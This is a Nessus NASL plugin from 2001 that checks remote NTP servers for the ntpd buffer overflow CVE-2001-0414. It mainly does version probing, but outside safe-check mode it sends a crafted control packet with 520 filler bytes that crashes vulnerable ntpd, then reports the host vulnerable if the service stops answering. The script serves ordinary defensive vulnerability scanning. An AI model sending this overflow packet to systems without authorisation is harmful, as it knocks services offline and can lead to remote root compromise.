if(description)
{
 script_id(10647);
 script_bugtraq_id(2540);
 script_cve_id("CVE-2001-0414");
 script_version ("$Revision: 1.21 $");

 
 name["english"] = "ntpd overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote NTP server was vulnerable to a buffer
overflow attack which allows anyone to use it to
execute arbitrary code as root.

Solution : disable this service if you do not use it, or upgrade
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "crashes the remote ntpd";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"]);
 script_dependencies("ntp_open.nasl");
 script_require_keys("NTP/Running");
 exit(0);
}

include('global_settings.inc');


function ntp_installed()
{
data = raw_string(0xDB, 0x00, 0x04, 0xFA, 0x00, 0x01,
    		  0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		  0x00, 0x00, 0xBE, 0x78, 0x2F, 0x1D, 0x19, 0xBA,
		  0x00, 0x00);

soc = open_sock_udp(123);
send(socket:soc, data:data);
r = recv(socket:soc, length:4096);
close(soc);
if(strlen(r) > 10)
 {
 return(1);
 }
return(0);
}

function ntp_filter()
{
 data = raw_string(0x16, 0x02, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00);
  soc = open_sock_udp(123); 
  send(socket:soc, data:data);
  r = recv(socket:soc, length:4096);
  close(soc);
  if(r){
    p = strstr(r, "version=");
    if (! p) p = strstr(r, "processor=");
    if (! p) p = strstr(r, "system=");
    p = ereg_replace(string:p, pattern:raw_string(0x22), replace:"'");
    if(egrep(pattern:"[^x]ntpd (4\.[1-9]|5\..*)", string:p))return(1);
    return 0;
    }
  else return 1; # Windows
}

if(!(get_udp_port_state(123)))exit(0);


if(ntp_installed())
{
if(safe_checks())
 { 
  if ( report_paranoia == 0 ) exit(0);
  if(ntp_filter())exit(0);
 warn = "
An NTP server is running on the remote host. Make sure that
you are running the latest version of your NTP server,
as some versions have been found out to be vulnerable to
buffer overflows.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

If you happen to be vulnerable : upgrade
Solution : Upgrade
Risk factor : High";

  security_warning(port:123, protocol:"udp", data:warn);
  exit(0);
 }


soc = open_sock_udp(123);
buf = raw_string(0x16, 0x02, 0x00, 0x01, 0x00, 0x00,
    		 0x00, 0x00, 0x00, 0x00, 0x01, 0x36, 0x73, 0x74,
		 0x72, 0x61, 0x74, 0x75, 0x6D, 0x3D) + crap(520);

send(socket:soc, data:buf);


buf = raw_string(0x16, 0x02, 0x00, 0x02, 0x00, 0x00,
    		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00);

send(socket:soc, data:buf);
close(soc);
if(!(ntp_installed()))security_hole(port:123, protocol:"udp");
}
